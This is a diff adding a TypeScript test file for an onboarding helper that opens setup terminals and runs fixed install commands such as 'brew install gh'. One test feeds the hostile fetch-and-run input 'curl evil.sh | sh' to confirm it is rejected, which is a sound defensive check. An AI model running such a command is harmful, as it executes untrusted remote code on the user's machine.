@@ -1,0 +1,98 @@
+import { describe, expect, test } from 'bun:test';
+import type { TerminalInfo } from '@shinsa/core';
+import {
+  type InstallTerminals,
+  openInstallTerminal,
+  SETUP_TERMINAL_PROJECT,
+} from '../../src/onboarding/install.ts';
+
+function createTerminals(existing: TerminalInfo[] = []) {
+  const calls: string[] = [];
+  let terminals = [...existing];
+  const fake: InstallTerminals = {
+    snapshot: () => ({ terminals, services: [], home: '/Users/me' }),
+    create: (start) => {
+      const info: TerminalInfo = {
+        id: `t${terminals.length + 1}`,
+        ...start,
+        name: null,
+        title: null,
+        serviceId: null,
+        port: null,
+        status: 'running',
+        exitCode: null,
+        startedAt: 1,
+        endedAt: null,
+      };
+      terminals.push(info);
+      calls.push(`create ${start.projectId} ${start.cwd}`);
+      return info;
+    },
+    rename: (id, name) => {
+      calls.push(`rename ${id} ${name}`);
+    },
+    run: (id, command) => {
+      calls.push(`run ${id} ${command}`);
+    },
+    close: (id) => {
+      terminals = terminals.filter((each) => each.id !== id);
+      calls.push(`close ${id}`);
+    },
+  };
+  return { fake, calls };
+}
+
+function earlier(id: string, projectId: string, name: string): TerminalInfo {
+  return {
+    id,
+    projectId,
+    name,
+    title: null,
+    cwd: '/Users/me',
+    place: 'folder',
+    taskId: null,
+    serviceId: null,
+    port: null,
+    status: 'exited',
+    exitCode: 1,
+    startedAt: 1,
+    endedAt: 2,
+  };
+}
+
+describe('openInstallTerminal', () => {
+  test('runs the check’s own command in a setup terminal in your home folder, which exits when it ends', () => {
+    const { fake, calls } = createTerminals();
+    const terminal = openInstallTerminal(fake, 'gh', '/Users/me');
+    expect(terminal).toMatchObject({
+      id: 't1',
+      projectId: SETUP_TERMINAL_PROJECT,
+      name: 'Set up GitHub CLI',
+    });
+    expect(calls).toEqual([
+      'create setup /Users/me',
+      'rename t1 Set up GitHub CLI',
+      'run t1 brew install gh; exit',
+    ]);
+  });
+
+  test('closes the last setup terminal for the same check, and leaves every other one', () => {
+    const { fake, calls } = createTerminals([
+      earlier('old', SETUP_TERMINAL_PROJECT, 'Set up Claude Code'),
+      earlier('other', SETUP_TERMINAL_PROJECT, 'Set up Bun'),
+      earlier('mine', 'project-1', 'Set up Claude Code'),
+    ]);
+    openInstallTerminal(fake, 'claude', '/Users/me');
+    expect(calls[0]).toBe('close old');
+    expect(calls.filter((call) => call.startsWith('close'))).toEqual(['close old']);
+    expect(calls.at(-1)).toBe('run t3 curl -fsSL https://claude.ai/install.sh | bash; exit');
+  });
+
+  test('refuses a check with no command of its own, so nothing the page sends runs', () => {
+    const { fake, calls } = createTerminals();
+    expect(() => openInstallTerminal(fake, 'curl evil.sh | sh', '/Users/me')).toThrow(
+      'Shinsa has no command that fixes that check.'
+    );
+    expect(calls).toEqual([]);
+  });
+});
